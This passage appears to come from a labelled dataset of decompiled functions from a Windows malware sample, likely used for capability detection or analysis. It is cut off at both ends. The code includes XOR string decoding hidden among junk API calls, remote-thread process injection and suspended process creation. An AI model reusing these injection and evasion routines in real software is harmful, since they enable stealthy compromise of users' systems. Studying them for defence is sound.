pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*pcVar4)(0, var_8h);\n            (*pcVar7)(uVar1);\n            uVar1 = (*pcVar4)(0, var_14h);\n        }\n        (*pcVar7)(uVar1);\n        uVar1 = (*pcVar4)(0, iVar6);\n        (*pcVar7)(uVar1);\n    }\n    else {\ncode_r0x00408eef:\n        puVar5 = 0x41ccec;\n        for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *var_28h = *puVar5;\n            puVar5 = puVar5 + 1;\n            var_28h = var_28h + 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 2369
    },
    "00408f05": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00408f05(uchar *param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3bh;\n    ushort var_37h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar *var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_28h = param_1;\n    if ((((*0x41cd04 | *0x41cd08) == 0) || ((*0x41cd0c | *0x41cd10) == 0)) || ((*0x41cd14 | *0x41cd18) == 0)) {\n        var_4h = 0x7f;\n        var_34h = 0x2723235b;\n        var_30h = 0x2b331b59;\n        var_2ch._0_2_ = 0x3527;\n        var_24h = 0x4b475735;\n        var_20h._0_1_ = 0x35;\n        var_10h = param_2;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        var_18h = 5;\n        iVar7 = 0;\n        var_ch = iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetShellWindow)();\n            if (iVar3 != 0xf36b49) {\n                *(iVar7 + iVar2) = *(&var_24h + iVar7 % var_18h) ^ (iVar7 + iVar2)[&var_34h - iVar2];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 10);\n        var_40h._0_1_ = 5;\n        stack0xffffffbd = 0x5d2f1d37;\n        var_3bh = 0x3172d19;\n        var_37h = 0x320f;\n        var_30h = 0x636f5349;\n        var_2ch._0_2_ = 0x7832;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        var_1ch = 6;\n        iVar7 = 0;\n        var_14h = iVar2;\n        var_8h = &var_40h - iVar2;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetMessagePos)();\n            iVar3 = var_ch;\n            if (iVar4 != 0x957e94) {\n                *(iVar7 + iVar2) = *(&var_30h + iVar7 % var_1ch) ^ (iVar7 + iVar2)[&var_40h - iVar2];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xb);\n        *0x41cd04 = fcn.004085e0(iVar2);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (*0x41cd04 == 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_58h = 0x1e073522;\n            var_54h = 0x7011a50;\n            var_50h = 0x350b5636;\n            var_4ch = 0x2f502b00;\n            var_48h = 0x502b1135;\n            var_44h._0_2_ = 0x221d;\n            var_44h._2_1_ = 0x75;\n            var_30h = 0x5975516e;\n            var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x35);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar7 = 0;\n            var_24h = &var_58h - iVar2;\n            var_8h = iVar2;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n                iVar3 = var_ch;\n                if (iVar4 != 0xd32a2c) {\n                    *(iVar7 + iVar2) = *(&var_30h + iVar7 % var_18h) ^ (iVar7 + iVar2)[&var_58h - iVar2];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x17);\n            *0x41cd0c = fcn.004085e0(iVar2);\n            iVar2 = var_14h;\n            if (*0x41cd0c == 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                (*pcVar5)(uVar1);\n                uVar1 = (*pcVar8)(0, iVar3);\n                (*pcVar5)(uVar1);\n                goto code_r0x00409237;\n            }\n            var_58h = 0x1f66022a;\n            var_54h = 0x16153758;\n            var_50h = 0x315e3b42;\n            var_4ch = 0x1570004;\n            var_48h = 0x1a1d267a;\n            var_44h._0_2_ = 0x1444;\n            var_44h._2_1_ = 0x37;\n            var_30h = 0x6d367570;\n            var_2ch._0_2_ = 0x4337;\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar7 = 0;\n            var_24h = &var_58h - iVar2;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetCapture)();\n                iVar3 = var_ch;\n                if (iVar4 != 0x1ad77c) {\n                    *(iVar7 + iVar2) = *(&var_30h + iVar7 % var_1ch) ^ (iVar7 + iVar2)[&var_58h - iVar2];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x17);\n            *0x41cd14 = fcn.004085e0(iVar2);\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (*0x41cd14 != 0) {\n                var_4h = 0;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, var_8h);\n                (*pcVar8)(uVar1);\n                uVar1 = (*pcVar5)(0, var_14h);\n                (*pcVar8)(uVar1);\n                uVar1 = (*pcVar5)(0, iVar3);\n                (*pcVar8)(uVar1);\n                goto code_r0x0040922a;\n            }\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*pcVar5)(0, var_8h);\n            (*pcVar8)(uVar1);\n            uVar1 = (*pcVar5)(0, var_14h);\n        }\n        (*pcVar8)(uVar1);\n        uVar1 = (*pcVar5)(0, iVar3);\n        (*pcVar8)(uVar1);\n    }\n    else {\ncode_r0x0040922a:\n        puVar6 = 0x41cd04;\n        for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *var_28h = *puVar6;\n            puVar6 = puVar6 + 1;\n            var_28h = var_28h + 1;\n        }\n    }\ncode_r0x00409237:\n    *0x41cd18 = *0x41cd14 >> 0x20;\n    *0x41cd10 = *0x41cd0c >> 0x20;\n    *0x41cd08 = *0x41cd04 >> 0x20;\n    return var_4h;\n}\n",
        "token_count": 2290
    },
    "00409408": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00409408(int32_t *arg_8h, int32_t lpStartAddress, int32_t lpParameter, uint32_t arg_14h)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int16_t *piVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    code *pcVar10;\n    int16_t *piVar11;\n    uint uVar12;\n    uint unaff_EDI;\n    uint uVar13;\n    int64_t iVar14;\n    uint arg_10h;\n    uchar *puVar15;\n    uint uVar16;\n    int32_t *piStack140;\n    int32_t iVar17;\n    uint uStack124;\n    uchar *puStack120;\n    uint uStack116;\n    uint uStack112;\n    uchar auStack108 [4];\n    int32_t iStack104;\n    uint uStack100;\n    uint uStack96;\n    uint8_t auStack92 [2];\n    ushort uStack90;\n    uchar uStack88;\n    uchar uStack87;\n    uchar uStack86;\n    uchar uStack85;\n    ushort uStack84;\n    uchar uStack82;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    int32_t aiStack56 [2];\n    ushort uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    piStack140 = 0x40941a;\n    cVar2 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    iStack104 = 0;\n    piVar5 = arg_8h + 1;\n    uStack112 = piVar5;\n    if (*piVar5 != 0) {\n        piStack140 = *piVar5;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        *piVar5 = 0;\n    }\n    uVar12 = 0xffffffff;\n    if (((arg_14h & 0x10) == 0) && ((*0x41cda4 & 1) != 0)) {\n        uStack124 = 5;\n        iVar14 = CONCAT44(5, puStack120);\n        if (cVar2 != '\\x05') {\n            if ((*0x41cde8 | *0x41cdec) == 0) {\n                piStack140 = 0xb;\n                uStack72 = 0x2723235b;\n                uStack68 = 0x2b331b59;\n                uStack64 = CONCAT22(uStack64._2_2_, 0x3527);\n                uStack80 = 0x4b475735;\n                uStack76 = CONCAT31(uStack76._1_3_, 0x35);\n                iVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8);\n                iVar17 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                iVar4 = 0;\n                uStack100 = &stack0xffffffac + -iVar17;\n                iStack104 = iVar17;\n                do {\n                    iVar6 = (*_sym.imp.USER32.dll_GetShellWindow)();\n                    if (iVar6 != 0xf36b49) {\n                        *(iVar4 + iVar17) = (&stack0xffffffa4)[iVar4 % 5] ^ (iVar4 + iVar17)[uStack100];\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 10);\n                uStack44 = 0x7419136b;\n                uStack40 = 0x1065c34;\n                uStack36 = 0x24a1352;\n                uStack32 = 0x4b2e6307;\n                uStack28 = 0x46531402;\n                auStack92[0] = 0x39;\n                auStack92[1] = 0x67;\n                uStack90 = 0x3775;\n                uStack88 = 0x46;\n                uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n                iVar17 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar12);\n                iVar4 = 0;\n                uStack112 = &stack0xffffffc8 + -iVar17;\n                uVar12 = 0xffffffff;\n                do {\n                    iVar6 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n                    if (iVar6 != 0xbcdf55) {\n                        *(iVar4 + iVar17) = (&stack0xffffff98)[iVar4 % iVar3] ^ *(uStack112 + iVar4 + iVar17);\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 0x14);\n                fcn.004080d2();\n                *0x41cde8 = fcn.004085e0(iVar17);\n                uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar17);\n                pcVar10 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n                uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uStack116);\n                (*pcVar10)(uVar16);\n                *0x41cde0 = CONCAT44(*0x41cde4, *0x41cde0);\n                if (*0x41cde8 == 0) goto code_r0x00409c25;\n            }\n            *0x41cdec = *0x41cde8 >> 0x20;\n            uVar12 = 0xffffffff;\n            piStack140 = &stack0xffffffb8 >> 0x1f;\n            iVar3 = fcn.0040fe80(*0x41cde8, *0x41cdec, 10, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, 0, 0, 0, 0);\n            *0x41cde0 = CONCAT44(*0x41cde4, *0x41cde0);\n            if (-1 < iVar3) {\n                uVar12 = 0;\n                *0x41cde0 = CONCAT44(*0x41cde4, *0x41cde0);\n            }\n            goto code_r0x00409c25;\n        }\n        if ((*0x41cde0 | *0x41cde4) == 0) {\n            piStack140 = 0x409484;\n            fcn.004080d2();\n            pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            piStack140 = 0xb;\n            uStack72 = 0x2723235b;\n            uStack68 = 0x2b331b59;\n            uStack64 = CONCAT22(uStack64._2_2_, 0x3527);\n            uStack88 = 0x35;\n            uStack87 = 0x57;\n            uStack86 = 0x47;\n            uStack85 = 0x4b;\n            uStack84 = CONCAT11(uStack84._1_1_, 0x35);\n            uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar12);\n            iVar17 = 0;\n            puStack120 = &stack0xffffffac + -iVar3;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetShellWindow)();\n                if (iVar4 != 0xf36b49) {\n                    *(iVar17 + iVar3) = (&stack0xffffff9c)[iVar17 % 5] ^ (iVar17 + iVar3)[puStack120];\n                }\n                iVar17 = iVar17 + 1;\n            } while (iVar17 < 10);\n            uVar16 = 0xc;\n            uStack68 = 0x2f1d3705;\n            uStack64 = 0x172d195d;\n            uStack60 = uStack60 & 0xff000000 | 0x320f03;\n            auStack92[0] = 0x49;\n            auStack92[1] = 0x53;\n            uStack90 = 0x636f;\n            uStack88 = 0x32;\n            uStack87 = 0x78;\n            iVar3 = (*pcVar10)(8, 0xc);\n            piVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n            iVar4 = 6;\n            iVar17 = 0;\n            puVar15 = &stack0xffffffb0 + -piVar5;\n            uVar12 = 0xffffffff;\n            uStack112 = piVar5;\n            do {\n                iVar6 = (*_sym.imp.USER32.dll_GetMessagePos)();\n                uVar13 = piStack140;\n                if (iVar6 != 0x957e94) {\n                    *(iVar17 + piVar5) = (&stack0xffffff98)[iVar17 % iVar4] ^ (iVar17 + piVar5)[puVar15];\n                }\n                iVar17 = iVar17 + 1;\n            } while (iVar17 < 0xb);\n            iVar14 = fcn.004085e0(piVar5);\n            if (iVar14 != 0) {\n                arg_10h = 8;\n                uStack80 = 0x6224555b;\n                uStack76 = 0x413b3018;\n                uStack72 = 0x555c6a07;\n                uStack68 = 0x300b6223;\n                uStack64 = 0x6a074126;\n                uStack60 = CONCAT22(uStack60._2_2_, 0x5530);\n                iStack104 = 0x62415530;\n                uStack100 = CONCAT31(uStack100._1_3_, 0x6a);\n                uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x2d);\n                uStack124 = iVar14 >> 0x20;\n                puStack120 = iVar14;\n                piVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                uStack124 = iVar14 >> 0x20;\n                puStack120 = iVar14;\n                iVar17 = 0;\n                uVar13 = uVar16;\n                do {\n                    iVar6 = (*_sym.imp.USER32.dll_GetShellWindow)();\n                    uStack124 = iVar14 >> 0x20;\n                    puStack120 = iVar14;\n                    if (iVar6 != 0x478d79) {\n                        *(iVar17 + piVar7) =\n                             (&stack0xffffff8c)[iVar17 % iVar3] ^ (iVar17 + piVar7)[&stack0xffffffa4 + -piVar7];\n                    }\n                    iVar17 = iVar17 + 1;\n                } while (iVar17 < 0x16);\n                aiStack56[0] = piVar7 >> 0x1f;\n                piVar11 = piVar7;\n                do {\n                    iVar1 = *piVar11;\n                    piVar11 = piVar11 + 1;\n                } while (iVar1 != piStack140);\n                iVar1 = (piVar11 - (piVar7 + 1) >> 1) * 2;\n                uStack64 = 0;\n                uStack68 = CONCAT22(iVar1 + 2, iVar1);\n                uVar16 = uVar13;\n                uStack60 = piVar7;\n                iVar17 = fcn.0040fe80(iVar4, unaff_EDI, 4, 0, 0, 0, 0, 0, &stack0xffffffbc, &stack0xffffffbc >> 0x1f, \n                                      &stack0xffffff94, &stack0xffffff94 >> 0x1f, uVar12, arg_10h);\n                pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uStack124 = iVar14 >> 0x20;\n                puStack120 = iVar14;\n                if (iVar17 < 0) {\n                    uVar12 = fcn.0040f4a9();\n                    uStack124 = iVar14 >> 0x20;\n                    puStack120 = iVar14;\n                }\n                else {\n                    auStack92[0] = 0x22;\n                    auStack92[1] = 0x50;\n                    uStack90 = 0x193d;\n                    uStack88 = 0x2a;\n                    uStack87 = 0x25;\n                    uStack86 = 0x57;\n                    uStack85 = 0x2e;\n                    uStack84 = 0x2a04;\n                    uStack82 = 0x49;\n                    uStack116 = 0x774f3549;\n                    uStack112 = CONCAT31(uStack112._1_3_, 0x4f);\n                    uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n                    uStack124 = iVar14 >> 0x20;\n                    puStack120 = iVar14;\n                    iVar17 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar12);\n                    uStack124 = iVar14 >> 0x20;\n                    puStack120 = iVar14;\n                    iVar4 = 0;\n                    puVar15 = &stack0xffffff98 + -iVar17;\n                    uVar13 = uVar16;\n                    do {\n                        iVar6 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n                        uStack124 = iVar14 >> 0x20;\n                        puStack120 = iVar14;\n                        if (iVar6 != 0x94effe) {\n                            *(iVar4 + iVar17) = (&stack0xffffff80)[iVar4 % 5] ^ (iVar4 + iVar17)[puVar15];\n                        }\n                        iVar4 = iVar4 + 1;\n                    } while (iVar4 < 0xb);\n                    iStack104 = 0x50521c3b;\n                    uStack100 = 0xb2a2942;\n                    uStack96 = 0x29425e5a;\n                    auStack92[0] = 0x2c;\n                    auStack92[1] = 6;\n                    uStack90 = 0x5445;\n                    uStack88 = 0x57;\n                    uStack87 = 0x28;\n                    uStack86 = 0x78;\n                    piVar7 = 0x31376e78;\n                    uStack124 = CONCAT22(iVar14 >> 0x30, 0x4c36);\n                    uVar12 = (*pcVar10)(8, 0x14);\n                    iVar17 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar12);\n                    iVar6 = 0;\n                    puVar15 = &stack0xffffff8c + -iVar17;\n                    uVar12 = 0xffffffff;\n                    do {\n                        iVar8 = (*_sym.imp.USER32.dll_GetCursor)();\n                        if (iVar8 != 0x746e60) {\n                            *(iVar6 + iVar17) = (&stack0xffffff74)[iVar6 % iVar4] ^ (iVar6 + iVar17)[puVar15];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 0x13);\n                    *0x41cde0 = fcn.004085e0(iVar17);\n                    pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar17);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n                    uVar16 = (*pcVar10)(0, iVar3);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n                    iVar14 = CONCAT44(uStack124, puStack120);\n                }\n                uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar7);\n                uStack124 = iVar14 >> 0x20;\n                puStack120 = iVar14;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n                uStack124 = iVar14 >> 0x20;\n                puStack120 = iVar14;\n                piVar5 = uStack112;\n            }\n            pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n            uStack124 = iVar14 >> 0x20;\n            puStack120 = iVar14;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n            uStack124 = iVar14 >> 0x20;\n            puStack120 = iVar14;\n            uVar16 = (*pcVar10)(0, uVar13);\n            uStack124 = iVar14 >> 0x20;\n            puStack120 = iVar14;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n            uStack124 = iVar14 >> 0x20;\n            puStack120 = iVar14;\n            piVar5 = uStack112;\n            if (*0x41cde0 == 0) goto code_r0x00409c25;\n        }\n        *0x41cde4 = *0x41cde0 >> 0x20;\n        piStack140 = arg_8h + 3 >> 0x1f;\n        iVar3 = fcn.0040fe80(*0x41cde0, *0x41cde4, 7, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, lpStartAddress, \n                             lpStartAddress >> 0x1f, lpParameter, lpParameter >> 0x1f);\n        uStack124 = iVar14 >> 0x20;\n        puStack120 = iVar14;\n        *piVar5 = iVar3;\n        if (iVar3 == 0) goto code_r0x00409c25;\n    }\n    else {\n        uStack124 = 5;\n        if (cVar2 != '\\x05') {\n            piStack140 = 0xb;\n            aiStack56[0] = 0x2723235b;\n            aiStack56[1] = 0x2b331b59;\n            uStack48 = 0x3527;\n            uStack80 = 0x4b475735;\n            uStack76 = CONCAT31(uStack76._1_3_, 0x35);\n            puVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n            iVar17 = 0;\n            uStack100 = &stack0xffffffbc + -iVar3;\n            iStack104 = iVar3;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetShellWindow)();\n                if (iVar4 != 0xf36b49) {\n                    *(iVar17 + iVar3) = (&stack0xffffffa4)[iVar17 % 5] ^ (iVar17 + iVar3)[uStack100];\n                }\n                iVar17 = iVar17 + 1;\n            } while (iVar17 < 10);\n            uStack44 = 0x7419136b;\n            uStack40 = 0x1065c34;\n            uStack36 = 0x24a1352;\n            uStack32 = 0x4b2e6307;\n            uStack28 = 0x46531402;\n            auStack92[0] = 0x39;\n            auStack92[1] = 0x67;\n            uStack90 = 0x3775;\n            uStack88 = 0x46;\n            uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar12);\n            iVar17 = 0;\n            uStack112 = &stack0xffffffc8 + -iVar3;\n            uVar12 = 0xffffffff;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n                if (iVar4 != 0xbcdf55) {\n                    *(iVar17 + iVar3) = (&stack0xffffff98)[iVar17 % puVar9] ^ (iVar17 + iVar3)[uStack112];\n                }\n                iVar17 = iVar17 + 1;\n            } while (iVar17 < 0x14);\n            uVar16 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uStack116, iVar3);\n            pcVar10 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar16);\n            if (pcVar10 != NULL) {\n                iVar17 = (*pcVar10)(*arg_8h, 0, 0, 0, 0, 0, lpStartAddress, lpParameter, puVar9, &stack0xffffff94);\n                if (iVar17 < 0) {\n                    uVar12 = fcn.0040f4a9();\n                }\n                else {\n                    uStack124 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*puVar9, 30000);\n                    if (uStack124 == 0) {\n                        (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*puVar9, &stack0xffffff84);\n                    }\n                    uVar12 = 0;\n                }\n            }\n            uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            pcVar10 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n            uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uStack116);\n            (*pcVar10)(uVar16);\n            goto code_r0x00409c25;\n        }\n        piStack140 = arg_8h + 3;\n        iVar3 = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)(*arg_8h, 0, 0, lpStartAddress, lpParameter, 0);\n        *piVar5 = iVar3;\n        if (iVar3 == 0) {\n            uVar12 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            goto code_r0x00409c25;\n        }\n        uStack124 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(iVar3, 30000);\n        if (uStack124 == 0) {\n            (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*piVar5, &stack0xffffff84);\n        }\n    }\n    uVar12 = 0;\ncode_r0x00409c25:\n    *0x41cdec = *0x41cde8 >> 0x20;\n    *0x41cde4 = *0x41cde0 >> 0x20;\n    return uVar12;\n}\n",
        "token_count": 5126
    },
    "00409c2e": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00409c2e(uchar *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    uchar *puVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t *piVar8;\n    uint32_t uVar9;\n    uint uVar10;\n    int32_t iVar11;\n    uint unaff_EBX;\n    uchar *puVar12;\n    uint32_t uVar13;\n    uint32_t unaff_EDI;\n    int32_t iVar14;\n    uchar *puVar15;\n    uchar *puVar16;\n    int32_t *piStack1008;\n    uint32_t uStack1004;\n    uint uStack1000;\n    uchar *puStack992;\n    uchar *puStack984;\n    int32_t iStack980;\n    uint32_t uStack976;\n    uint uStack972;\n    uint uStack968;\n    uchar *puStack964;\n    uint uStack960;\n    uint uStack956;\n    uint uStack952;\n    uint uStack948;\n    uint uStack924;\n    int32_t iStack920;\n    uint32_t uStack916;\n    uint uStack912;\n    uint uStack908;\n    uint uStack900;\n    uint32_t uStack896;\n    int32_t iStack892;\n    uint uStack888;\n    uint uStack884;\n    uint uStack880;\n    uint uStack876;\n    uint uStack872;\n    uint uStack868;\n    uint uStack864;\n    uint uStack860;\n    uint uStack856;\n    uint uStack852;\n    uint uStack848;\n    uchar auStack840 [28];\n    uint uStack812;\n    uint uStack804;\n    uchar auStack740 [88];\n    int32_t iStack652;\n    int32_t iStack636;\n    \n    uStack948 = 0x208;\n    uStack952 = 8;\n    uStack956 = 0x409c52;\n    uStack956 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    uStack960 = 0x409c5b;\n    puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    uStack900 = 0x6f076955;\n    uStack852 = 0;\n    iStack920 = 0;\n    uStack916 = uStack916 & 0xffffff00;\n    uStack912 = 0;\n    uStack908 = 0;\n    uStack848 = 0;\n    puVar16 = &stack0xfffffcd4;\n    for (iVar11 = 0x44; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar16 = 0;\n        puVar16 = puVar16 + 1;\n    }\n    uStack812 = 0x44;\n    puVar16 = &stack0xfffffcb8;\n    for (iVar11 = 0x10; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar16 = 0;\n        puVar16 = puVar16 + 1;\n    }\n    uStack896 = 0x541a703c;\n    iStack892 = 0x6915451b;\n    puVar16 = &stack0xfffffd1c;\n    for (iVar11 = 0x2cc; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar16 = 0;\n        puVar16 = puVar16 + 1;\n    }\n    uStack960 = 0x5d;\n    uStack888 = 0x70176f39;\n    uStack884 = 0x45005406;\n    for (iVar11 = 0x208; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    puStack964 = 0x8;\n    uStack880 = 0x6f716904;\n    uStack876 = 0x543a7019;\n    uStack872 = 0x69034516;\n    uStack868 = 0x70206f20;\n    uStack864 = 0x455c5404;\n    uStack860 = 0x6f086942;\n    uStack856 = CONCAT22(uStack856._2_2_, 0x7045);\n    uStack924 = CONCAT31(uStack924._1_3_, 0x45);\n    uStack968 = 0x409d28;\n    uStack968 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack972 = 0x409d2b;\n    iVar11 = (*pcVar4)();\n    uStack916 = 5;\n    iVar14 = 0;\n    uStack856 = iVar11;\n    do {\n        uStack972 = 0x409d49;\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        if (iVar6 != 0x8089b) {\n            *(iVar14 + iVar11) = (&stack0xfffffc54)[iVar14 % uStack916] ^ (iVar14 + iVar11)[&stack0xfffffc70 + -iVar11];\n        }\n        iVar14 = iVar14 + 1;\n    } while (iVar14 < 0x2e);\n    uStack972 = 0x104;\n    puStack984 = 0x409d7a;\n    iStack980 = iVar11;\n    uStack976 = unaff_EDI;\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)();\n    pcVar4 = _sym.imp.KERNEL32.dll_lstrcatW;\n    puStack984 = puStack964;\n    puStack992 = 0x409d87;\n    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n    puStack992 = 0x410518;\n    uStack1000 = 0x409d8f;\n    (*pcVar4)();\n    uStack1000 = arg_8h;\n    piStack1008 = 0x409d95;\n    uStack1004 = unaff_EDI;\n    (*pcVar4)();\n    piStack1008 = 0x410520;\n    (*pcVar4)(unaff_EDI);\n    pcVar4 = _sym.imp.KERNEL32.dll_CreateProcessW;\n    while (iVar14 = (*pcVar4)(0, unaff_EDI, 0, 0, 0, 0x800000c, 0, 